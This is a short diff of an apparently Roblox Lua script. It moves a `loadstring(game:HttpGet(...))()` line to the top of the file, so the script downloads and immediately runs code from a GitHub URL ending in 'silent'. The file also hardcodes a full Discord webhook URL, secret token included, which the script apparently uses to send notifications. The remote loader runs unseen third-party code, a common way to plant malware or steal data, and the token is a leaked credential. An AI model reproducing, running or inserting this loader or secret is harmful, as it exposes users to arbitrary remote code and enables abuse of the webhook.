@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xfarzadxx/main/main/silent'))()
 local webh = "https://discord.com/api/webhooks/1230977723812548700/3oDKZ7DukzE-4xj_ZneORDxHmUzU6fTIsG40GSdqbjqVa1c_wsQVZiXA2wCBUkLQQyhi"
 
 pcall(function()
@@ -66,4 +67,3 @@ while true do
 		wait(TimeBetweenNotifications)
 	end
 end
-loadstring(game:HttpGet('https://raw.githubusercontent.com/xfarzadxx/main/main/silent'))()
